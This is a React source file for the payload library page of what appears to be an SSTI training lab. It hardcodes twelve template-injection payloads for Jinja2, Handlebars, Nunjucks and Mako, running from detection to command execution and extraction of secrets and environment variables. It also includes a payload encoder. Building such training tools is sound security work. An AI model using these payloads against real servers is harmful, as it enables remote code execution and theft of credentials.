import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Copy, Crosshair, Check, Lock, Unlock } from 'lucide-react';
import { Card } from '../components/ui/Card';
import { StageBadge, EngineBadge, SeverityBadge } from '../components/ui/Badge';
import { Button } from '../components/ui/Button';
import { CodeViewer } from '../components/ui/CodeViewer';
import { useAttackStore } from '../stores/attackStore';
import type { Payload, EngineId, StageId, Severity } from '../types';

const DEMO_PAYLOADS: Payload[] = [
  { id: 'PL-001', name: 'Basic Math Detection', engine: 'jinja2', stage: 'DETECT', severity: 'low', payload: '{{7*7}}', expected_result: '49', explanation: 'Evaluates arithmetic — result of 49 confirms template injection is possible.' },
  { id: 'PL-002', name: 'Config Class Fingerprint', engine: 'jinja2', stage: 'FINGERPRINT', severity: 'medium', payload: '{{config.__class__.__init__.__globals__}}', expected_result: '<class jinja2.environment.Environment>', explanation: 'Accesses the Flask/Jinja2 config object to fingerprint the engine version and globals.' },
  { id: 'PL-003', name: 'MRO Subclass Escape', engine: 'jinja2', stage: 'ESCAPE', severity: 'high', payload: '{{"".__class__.__mro__[1].__subclasses__()}}', expected_result: '[<class \'type\'>, ...]', explanation: 'Walks Python MRO to enumerate all loaded subclasses, finding exploitable ones.' },
  { id: 'PL-004', name: 'Subprocess RCE', engine: 'jinja2', stage: 'RCE', severity: 'critical', payload: '{{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0].strip()}}', expected_result: 'uid=33(www-data)', explanation: 'Leverages subprocess.Popen via subclass enumeration for OS command execution.' },
  { id: 'PL-005', name: 'Constructor Chain HBS', engine: 'handlebars', stage: 'DETECT', severity: 'medium', payload: '{{constructor.constructor("return process")()}}', expected_result: '[object process]', explanation: 'Accesses Node.js process object via constructor chain in Handlebars.' },
  { id: 'PL-006', name: 'Nunjucks Range RCE', engine: 'nunjucks', stage: 'RCE', severity: 'critical', payload: "{{range.constructor('return require(\"child_process\").execSync(\"id\").toString()')()", expected_result: 'uid=1000(node)', explanation: 'Abuses range.constructor to construct and immediately invoke a new Function with require.' },
  { id: 'PL-007', name: 'Mako Python Exec', engine: 'mako', stage: 'RCE', severity: 'critical', payload: '<% import subprocess %>\n${subprocess.check_output(["id"])}', expected_result: 'uid=33(www-data)', explanation: 'Mako allows raw Python imports in template blocks — direct code execution.' },
  { id: 'PL-008', name: 'Mako Detection', engine: 'mako', stage: 'DETECT', severity: 'low', payload: '${7*7}', expected_result: '49', explanation: 'Mako uses ${} syntax for expressions. Math evaluation confirms SSTI.' },
  { id: 'PL-009', name: 'Nunjucks Env Extract', engine: 'nunjucks', stage: 'EXTRACT', severity: 'high', payload: '{{range.constructor("return process.env")()}}', expected_result: 'PATH=/usr/local/sbin ...', explanation: 'Extracts server environment variables via process.env access through range.constructor.' },
  { id: 'PL-010', name: 'Jinja2 Config Extract', engine: 'jinja2', stage: 'EXTRACT', severity: 'high', payload: '{{config.items()}}', expected_result: "dict_items([('SECRET_KEY', 'hunter2'), ...])", explanation: 'Dumps all Flask configuration including secret keys and database credentials.' },
  { id: 'PL-011', name: 'HBS With Scope', engine: 'handlebars', stage: 'ESCAPE', severity: 'high', payload: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}', expected_result: 'Function', explanation: 'Chains Handlebars scoping helpers to reach Function constructor through prototype chain.' },
  { id: 'PL-012', name: 'Mako Self Dict', engine: 'mako', stage: 'FINGERPRINT', severity: 'medium', payload: '${self.__dict__}', expected_result: "{'_node': <mako.template.Template ...>}", explanation: 'Reveals Mako template internal object structure for fingerprinting.' },
];

const ALL_ENGINES: (EngineId | 'ALL')[] = ['ALL', 'jinja2', 'handlebars', 'nunjucks', 'mako'];
const ALL_STAGES: (StageId | 'ALL')[] = ['ALL', 'DETECT', 'FINGERPRINT', 'EXTRACT', 'ESCAPE', 'RCE'];
const ALL_SEVERITIES: (Severity | 'ALL')[] = ['ALL', 'critical', 'high', 'medium', 'low', 'info'];

type EncodeMode = 'base64' | 'url' | 'doubleUrl' | 'html' | 'unicode';

function encodePayload(input: string, mode: EncodeMode): string {
  if (!input) return '';
  switch (mode) {
    case 'base64':    return btoa(unescape(encodeURIComponent(input)));
    case 'url':       return encodeURIComponent(input);
    case 'doubleUrl': return encodeURIComponent(encodeURIComponent(input));
    case 'html':      return input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;').replace(/\//g,'&#x2F;');
    case 'unicode':   return [...input].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join('');
    default:          return input;
  }
}

const ENCODE_BUTTONS: { mode: EncodeMode; label: string }[] = [
  { mode: 'base64',    label: 'Base64' },
  { mode: 'url',       label: 'URL' },
  { mode: 'doubleUrl', label: '2× URL' },
  { mode: 'html',      label: 'HTML' },
  { mode: 'unicode',   label: 'Unicode' },
];

export const Payloads: React.FC = () => {
  const navigate = useNavigate();
  const { setEngine, setActiveStage } = useAttackStore();
  const [filterEngine, setFilterEngine] = useState<EngineId | 'ALL'>('ALL');
  const [filterStage, setFilterStage] = useState<StageId | 'ALL'>('ALL');
  const [filterSeverity, setFilterSeverity] = useState<Severity | 'ALL'>('ALL');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const [encInput, setEncInput] = useState('');
  const [encMode, setEncMode] = useState<EncodeMode>('base64');
  const [encOutput, setEncOutput] = useState('');
  const [encCopied, setEncCopied] = useState(false);

  const handleEncode = () => {
    setEncOutput(encodePayload(encInput, encMode));
  };

  const handleEncCopy = async () => {
    if (!encOutput) return;
    await navigator.clipboard.writeText(encOutput);
    setEncCopied(true);
    setTimeout(() => setEncCopied(false), 2000);
  };

  const filtered = DEMO_PAYLOADS.filter((p) => {
    if (filterEngine !== 'ALL' && p.engine !== filterEngine) return false;
    if (filterStage !== 'ALL' && p.stage !== filterStage) return false;
    if (filterSeverity !== 'ALL' && p.severity !== filterSeverity) return false;
    return true;
  });

  const handleCopy = async (id: string, payload: string) => {
    await navigator.clipboard.writeText(payload);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleRunInLab = (p: Payload) => {
    setEngine(p.engine as EngineId);
    setActiveStage(p.stage as StageId);
    navigate('/lab');
  };

  const FilterSelect = ({ value, onChange, options, label }: { value: string; onChange: (v: string) => void; options: string[]; label: string }) => (
    <div>
      <label style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.08em', display: 'block', marginBottom: 4 }}>
        {label}
      </label>
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        style={{
          background: 'var(--bg-nested)',
          border: '1px solid var(--border-muted)',
          borderRadius: 'var(--radius-sm)',
          color: 'var(--text-primary)',
          fontFamily: 'var(--font-mono)',
          fontSize: 12,
          padding: '6px 10px',
          outline: 'none',
          cursor: 'pointer',
          width: '100%',
        }}
      >
        {options.map((o) => (
          <option key={o} value={o}>{o}</option>
        ))}
      </select>
    </div>
  );

  return (
    <div style={{ height: '100%', display: 'flex', overflow: 'hidden' }}>
      {/* Sidebar filters */}
      <div style={{
        width: 220,
        background: 'var(--bg-workspace)',
        borderRight: '1px solid var(--border-subtle)',
        padding: '20px 16px',
        flexShrink: 0,
        display: 'flex',
        flexDirection: 'column',
        gap: 16,
        overflow: 'auto',
      }}>
        <h3 style={{ fontSize: 12, fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
          Filters
        </h3>
        <FilterSelect label="Engine" value={filterEngine} onChange={(v) => setFilterEngine(v as EngineId | 'ALL')} options={ALL_ENGINES as string[]} />
        <FilterSelect label="Stage" value={filterStage} onChange={(v) => setFilterStage(v as StageId | 'ALL')} options={ALL_STAGES as string[]} />
        <FilterSelect label="Severity" value={filterSeverity} onChange={(v) => setFilterSeverity(v as Severity | 'ALL')} options={ALL_SEVERITIES as string[]} />

        <div style={{ marginTop: 4, fontSize: 12, color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
          {filtered.length} of {DEMO_PAYLOADS.length} payloads
        </div>

        {/* Payload Encoder */}
        <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: 16, marginTop: 8 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 10 }}>
            <Lock size={11} color="var(--color-primary)" />
            <h3 style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-primary)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              Encoder
            </h3>
          </div>

          <textarea
            value={encInput}
            onChange={(e) => setEncInput(e.target.value)}
            placeholder="Paste payload to encode…"
            rows={3}
            style={{
              width: '100%',
              background: 'var(--bg-nested)',
              border: '1px solid var(--border-muted)',
              borderRadius: 'var(--radius-sm)',
              color: 'var(--text-primary)',
              fontFamily: 'var(--font-mono)',
              fontSize: 11,
              padding: '6px 8px',
              outline: 'none',
              resize: 'vertical',
              marginBottom: 8,
            }}
          />

          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginBottom: 8 }}>
            {ENCODE_BUTTONS.map(({ mode, label }) => (
              <button
                key={mode}
                onClick={() => setEncMode(mode)}
                style={{
                  padding: '3px 8px',
                  borderRadius: 4,
                  border: `1px solid ${encMode === mode ? 'var(--color-primary)' : 'var(--border-muted)'}`,
                  background: encMode === mode ? 'rgba(201,130,82,0.14)' : 'transparent',
                  color: encMode === mode ? 'var(--color-primary)' : 'var(--text-muted)',
                  fontFamily: 'var(--font-mono)',
                  fontSize: 10,
                  cursor: 'pointer',
                  transition: 'all 0.15s',
                }}
              >
                {label}
              </button>
            ))}
          </div>

          <button
            onClick={handleEncode}
            style={{
              width: '100%',
              padding: '6px 10px',
              borderRadius: 'var(--radius-sm)',
              border: '1px solid var(--color-primary)',
              background: 'rgba(201,130,82,0.12)',
              color: 'var(--color-primary)',
              fontFamily: 'var(--font-mono)',
              fontSize: 11,
              cursor: 'pointer',
              marginBottom: 8,
              transition: 'all 0.15s',
            }}
          >
            Encode →
          </button>

          {encOutput && (
            <div style={{ position: 'relative' }}>
              <div style={{
                background: 'var(--bg-nested)',
                border: '1px solid var(--border-accent)',
                borderRadius: 'var(--radius-sm)',
                padding: '6px 8px',
                fontFamily: 'var(--font-mono)',
                fontSize: 10,
                color: 'var(--color-ssti)',
                wordBreak: 'break-all',
                whiteSpace: 'pre-wrap',
                marginBottom: 6,
                maxHeight: 80,
                overflow: 'auto',
              }}>
                {encOutput}
              </div>
              <button
                onClick={handleEncCopy}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 4,
                  padding: '4px 10px',
                  borderRadius: 4,
                  border: `1px solid ${encCopied ? 'var(--color-success)' : 'var(--border-muted)'}`,
                  background: 'transparent',
                  color: encCopied ? 'var(--color-success)' : 'var(--text-muted)',
                  fontFamily: 'var(--font-mono)',
                  fontSize: 10,
                  cursor: 'pointer',
                  transition: 'all 0.15s',
                }}
              >
                {encCopied ? <Check size={10} /> : <Unlock size={10} />}
                {encCopied ? 'Copied' : 'Copy'}
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Payload list */}
      <div style={{ flex: 1, overflow: 'auto', padding: '20px' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          {filtered.map((payload, idx) => (
            <motion.div
              key={payload.id}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: idx * 0.04 }}
            >
              <Card>
                <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 12 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
                    <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)' }}>
                      {payload.id}
                    </span>
                    <EngineBadge engine={payload.engine} />
                    <StageBadge stage={payload.stage} />
                    <SeverityBadge severity={payload.severity} />
                  </div>
                </div>

                <h4 style={{ fontSize: 14, fontFamily: 'var(--font-heading)', marginBottom: 10 }}>
                  {payload.name}
                </h4>

                <CodeViewer code={payload.payload} label="PAYLOAD" maxHeight={80} />

                <div style={{ marginTop: 10, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 3 }}>
                      Expected
                    </div>
                    <code style={{ fontFamily: 'var(--font-mono)', fontSize: 12, color: 'var(--color-success)' }}>
                      {payload.expected_result}
                    </code>
                  </div>
                </div>

                <p style={{ color: 'var(--text-secondary)', fontSize: 12, lineHeight: 1.6, marginTop: 8 }}>
                  {payload.explanation}
                </p>

                <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
                  <Button
                    variant="ghost"
                    size="sm"
                    icon={copiedId === payload.id ? <Check size={12} /> : <Copy size={12} />}
                    onClick={() => handleCopy(payload.id, payload.payload)}
                  >
                    {copiedId === payload.id ? 'Copied' : 'Copy'}
                  </Button>
                  <Button
                    variant="primary"
                    size="sm"
                    icon={<Crosshair size={12} />}
                    onClick={() => handleRunInLab(payload)}
                  >
                    Run in Lab
                  </Button>
                </div>
              </Card>
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
};
